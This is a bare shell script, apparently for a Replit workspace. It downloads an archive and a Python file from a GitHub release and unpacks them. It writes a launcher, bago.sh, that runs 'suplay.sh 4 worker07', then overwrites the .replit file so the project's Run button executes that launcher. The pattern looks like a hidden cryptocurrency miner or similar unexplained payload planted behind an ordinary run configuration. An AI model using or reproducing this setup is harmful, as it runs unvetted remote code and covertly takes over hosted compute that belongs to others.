curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/power.py
echo '#!/bin/bash

bash suplay.sh 4 worker07' > bago.sh

echo 'modules = ["python-3.12"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "bago"

[[workflows.workflow]]
name = "bago"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash bago.sh"

[workflows.workflow.metadata]
outputType = "console"' > .replit
